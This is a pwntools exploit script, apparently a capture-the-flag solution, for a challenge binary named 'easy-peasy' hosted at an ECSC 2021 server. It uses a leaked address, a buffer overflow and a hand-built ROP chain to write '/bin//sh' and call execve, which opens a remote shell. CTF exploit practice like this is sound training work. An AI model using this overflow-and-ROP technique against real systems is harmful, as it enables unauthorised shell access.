from pwn import *

elf = context.binary = ELF("./easy-peasy")

if args.GDB:
	# p = gdb.debug(elf.path)
	p = gdb.debug(elf.path, '''
b *main+248
c
	''')
elif args.REMOTE:
	p = remote("ecsc21.hack.cert.pl", 25733)
else:
	p = process(elf.path)

OFFSET = 105

p.recvuntil('Buffer is at u8@')
leak = p.recvline().strip().decode()
base = int(leak, 16)
print(hex(base))


payload = b'A' * OFFSET

# input()

# put /bin/sh into allocated memory

# 0x00000000000093ef : pop rcx ; ret
payload += p64(base + 0x00000000000093ef) + p64(base + 0x1a1 + 0x7e)

# 0x00000000000031d3 : pop rdx ; ret
payload += p64(base + 0x00000000000031d3) + p64(0x6e69622f)

# 0x0000000000005157 : mov dword ptr [rcx - 0x7e], edx ; ret
payload += p64(base + 0x0000000000005157)


# 0x00000000000093ef : pop rcx ; ret
payload += p64(base + 0x00000000000093ef) + p64(base + 0x1a5 + 0x7e)

# 0x00000000000031d3 : pop rdx ; ret
payload += p64(base + 0x00000000000031d3) + p64(0x68732f2f)

# 0x0000000000005157 : mov dword ptr [rcx - 0x7e], edx ; ret
payload += p64(base + 0x0000000000005157)


# 0x00000000000011b3 : pop rdi ; ret
payload += p64(base + 0x00000000000011b3) + p64(base + 0x1a1)


# 0x000000000000194d : pop rsi ; ret
# payload += p64(base + 0x000000000000194d) + p64(0) # optimized out because 194c gadget

# 0x00000000000031d3 : pop rdx ; ret
payload += p64(base + 0x00000000000031d3) + p64(0x3b)

# 0x000000000000194c : xchg eax, edx ; pop rsi ; ret
payload += p64(base + 0x000000000000194c) + p64(0)

# 0x00000000000022b9 : syscall
payload += p64(base + 0x00000000000022b9)

# limit 256  bytes
print(len(payload))
if len(payload) > 256:
	print("Too long")

p.sendline(payload)
p.interactive()
